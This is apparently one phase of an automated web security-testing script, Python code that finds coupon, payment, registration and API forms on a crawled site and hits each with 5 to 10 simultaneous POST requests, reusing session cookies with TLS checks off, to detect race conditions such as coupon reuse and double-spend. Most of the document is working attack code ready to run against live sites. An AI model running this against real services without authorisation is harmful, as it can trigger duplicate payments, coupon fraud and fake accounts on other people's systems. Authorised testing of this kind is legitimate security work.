**Phase 22 — Race Conditions & Concurrency Attacks**

  Tests for TOCTOU (time-of-check to time-of-use) bugs: double-spend, coupon races,
  registration races, and concurrent state manipulation. Requires threading.

  ```python
  import time, json, threading
  from urllib.parse import urljoin
  from concurrent.futures import ThreadPoolExecutor, as_completed

  BASE    = _G['BASE']
  session = _G.get('session_a') or _G.get('session')
  ALL_FORMS  = _G.get('ALL_FORMS', []) + _G.get('AUTH_FORMS', [])

  race_findings = []

  # ══════════════════════════════════════════════════════════════
  # PART A — Coupon / Discount Race Condition
  # ══════════════════════════════════════════════════════════════
  COUPON_KEYWORDS = ['coupon', 'promo', 'discount', 'voucher', 'code', 'gift',
                     'redeem', 'campaign', 'offer', 'apply']
  coupon_forms = []
  for form in ALL_FORMS:
      fields = form.get('fields', [])
      coupon_fields = [f for f in fields if any(k in f.get('name','').lower() for k in COUPON_KEYWORDS)]
      if coupon_fields:
          coupon_forms.append((form, coupon_fields))

  if coupon_forms:
      print(f"[RACE] Testing {len(coupon_forms)} coupon forms for race conditions")
      for form, cf in coupon_forms[:5]:
          action = form.get('action', BASE)
          url = action if action.startswith('http') else urljoin(BASE, action)
          fields = form.get('fields', [])

          test_codes = ['DISCOUNT', 'PROMO', 'FREE', 'TEST', 'SAVE50']
          for code in test_codes:
              data = {f['name']: f.get('value','') or 'test' for f in fields if f.get('name')}
              data[cf[0]['name']] = code
              results = []
              errors = []

              def send_coupon(sess, url, data, idx):
                  try:
                      # Each thread uses its own session copy
                      s = __import__('requests').Session()
                      s.verify = False
                      s.cookies.update(sess.cookies)
                      r = s.post(url, data=data, timeout=10, allow_redirects=True)
                      return (idx, r.status_code, len(r.text), r.text[:200].lower())
                  except Exception as e:
                      return (idx, 0, 0, str(e))

              # Send 10 concurrent requests
              with ThreadPoolExecutor(max_workers=10) as executor:
                  futures = [executor.submit(send_coupon, session, url, data, i) for i in range(10)]
                  for f in as_completed(futures):
                      results.append(f.result())

              success_count = sum(1 for r in results
                                  if r[1] == 200 and ('applied' in r[3] or 'success' in r[3]))
              if success_count > 1:
                  print(f"  [HIGH] Coupon race: '{code}' applied {success_count}/10 times on {url}")
                  race_findings.append({
                      'url': url, 'type': 'coupon-race',
                      'desc': f"Coupon '{code}' applied {success_count} times concurrently",
                  })
                  break
  else:
      print("[RACE] No coupon forms found")

  # ══════════════════════════════════════════════════════════════
  # PART B — Transfer / Payment Double-Spend
  # ══════════════════════════════════════════════════════════════
  MONEY_KEYWORDS = ['transfer', 'send', 'pay', 'purchase', 'buy', 'checkout',
                    'order', 'donate', 'withdraw', 'amount']
  money_forms = []
  for form in ALL_FORMS:
      action_lower = (form.get('action','') + ' '.join(
          f.get('name','') for f in form.get('fields',[])
      )).lower()
      if any(k in action_lower for k in MONEY_KEYWORDS):
          money_forms.append(form)

  if money_forms:
      print(f"\n[RACE] Testing {len(money_forms)} payment/transfer forms for double-spend")
      for form in money_forms[:5]:
          action = form.get('action', BASE)
          url = action if action.startswith('http') else urljoin(BASE, action)
          fields = form.get('fields', [])
          data = {f['name']: f.get('value','') or '1' for f in fields if f.get('name')}

          results = []
          def send_payment(sess, url, data, idx):
              try:
                  s = __import__('requests').Session()
                  s.verify = False
                  s.cookies.update(sess.cookies)
                  r = s.post(url, data=data, timeout=10, allow_redirects=True)
                  return (idx, r.status_code, r.text[:300].lower())
              except Exception as e:
                  return (idx, 0, str(e))

          with ThreadPoolExecutor(max_workers=10) as executor:
              futures = [executor.submit(send_payment, session, url, data, i) for i in range(10)]
              for f in as_completed(futures):
                  results.append(f.result())

          success_signs = ['success', 'confirmed', 'processed', 'complete', 'thank',
                          'order', 'receipt', 'approved']
          success_count = sum(1 for r in results
                              if r[1] in (200, 201) and any(s in r[2] for s in success_signs))
          if success_count > 1:
              print(f"  [CRITICAL] Double-spend: {url} accepted {success_count}/10 concurrent payments")
              race_findings.append({
                  'url': url, 'type': 'double-spend',
                  'desc': f"Payment accepted {success_count} times concurrently",
              })
  else:
      print("[RACE] No payment/transfer forms found")

  # ══════════════════════════════════════════════════════════════
  # PART C — Registration Race (duplicate accounts)
  # ══════════════════════════════════════════════════════════════
  reg_forms = [f for f in ALL_FORMS if any(
      k in (f.get('action','') + ' '.join(fld.get('name','') for fld in f.get('fields',[]))).lower()
      for k in ['register', 'signup', 'sign-up', 'create_account', 'join']
  )]

  if reg_forms:
      print(f"\n[RACE] Testing {len(reg_forms)} registration forms for race conditions")
      for form in reg_forms[:3]:
          action = form.get('action', BASE)
          url = action if action.startswith('http') else urljoin(BASE, action)
          fields = form.get('fields', [])

          import random, string
          rand_user = 'racetest_' + ''.join(random.choices(string.ascii_lowercase, k=6))
          rand_email = f'{rand_user}@test.example.com'
          data = {f['name']: f.get('value','') or 'test' for f in fields if f.get('name')}
          # Fill in likely field names
          for f in fields:
              name = f.get('name', '').lower()
              if 'user' in name or 'login' in name:
                  data[f['name']] = rand_user
              elif 'email' in name:
                  data[f['name']] = rand_email
              elif 'pass' in name:
                  data[f['name']] = 'TestPass123!'
              elif 'confirm' in name:
                  data[f['name']] = 'TestPass123!'

          results = []
          def send_reg(sess, url, data, idx):
              try:
                  s = __import__('requests').Session()
                  s.verify = False
                  r = s.post(url, data=data, timeout=10, allow_redirects=True)
                  return (idx, r.status_code, r.text[:300].lower())
              except Exception as e:
                  return (idx, 0, str(e))

          with ThreadPoolExecutor(max_workers=5) as executor:
              futures = [executor.submit(send_reg, session, url, data, i) for i in range(5)]
              for f in as_completed(futures):
                  results.append(f.result())

          success_signs = ['success', 'created', 'welcome', 'registered', 'account', 'verify']
          success_count = sum(1 for r in results
                              if r[1] in (200, 201, 302) and any(s in r[2] for s in success_signs))
          if success_count > 1:
              print(f"  [MEDIUM] Registration race: {url} created {success_count} accounts for same user")
              race_findings.append({
                  'url': url, 'type': 'registration-race',
                  'desc': f"Same username registered {success_count} times concurrently",
              })
  else:
      print("[RACE] No registration forms found")

  # ══════════════════════════════════════════════════════════════
  # PART D — API Endpoint Race Conditions
  # ══════════════════════════════════════════════════════════════
  # Test state-changing API endpoints for TOCTOU
  api_endpoints = [p for p in _G.get('ALL_LINKS', set())
                   if '/api/' in p and ('post' in p.lower() or 'create' in p.lower()
                   or 'update' in p.lower() or 'add' in p.lower())]
  # Also look for API forms
  api_forms = [f for f in ALL_FORMS if '/api/' in f.get('action', '')]

  if api_endpoints or api_forms:
      print(f"\n[RACE] Testing {len(api_endpoints) + len(api_forms)} API endpoints for race conditions")
      for ep in list(set(api_endpoints))[:5]:
          url = ep.split('?')[0]
          results = []
          def send_api(sess, url, idx):
              try:
                  s = __import__('requests').Session()
                  s.verify = False
                  s.cookies.update(sess.cookies)
                  r = s.post(url, json={}, timeout=10,
                             headers={'Content-Type': 'application/json'})
                  return (idx, r.status_code, r.text[:200])
              except Exception as e:
                  return (idx, 0, str(e))

          with ThreadPoolExecutor(max_workers=10) as executor:
              futures = [executor.submit(send_api, session, url, i) for i in range(10)]
              for f in as_completed(futures):
                  results.append(f.result())

          # Check for inconsistent responses (sign of race condition)
          status_codes = set(r[1] for r in results)
          if len(status_codes) > 1 and 200 in status_codes:
              print(f"  [MEDIUM] Inconsistent responses on {url}: statuses={status_codes}")
              race_findings.append({
                  'url': url, 'type': 'api-race-inconsistent',
                  'desc': f"Mixed responses under concurrency: {status_codes}",
              })
  else:
      print("[RACE] No API state-changing endpoints found")

  # Summary
  print(f"\n=== RACE CONDITION SUMMARY: {len(race_findings)} issues found ===")
  for f in race_findings:
      sev = 'CRITICAL' if f['type'] == 'double-spend' else 'HIGH'
      print(f"  [{sev}] {f['type']}: {f.get('url','')} — {f.get('desc','')}")
  if race_findings:
      _G.setdefault('FINDINGS', []).extend([
          {'severity': 'CRITICAL' if f['type'] == 'double-spend' else 'HIGH',
           'title': f"Race Condition — {f['type']}",
           'url': f.get('url', ''), 'detail': f} for f in race_findings
      ])
  ```
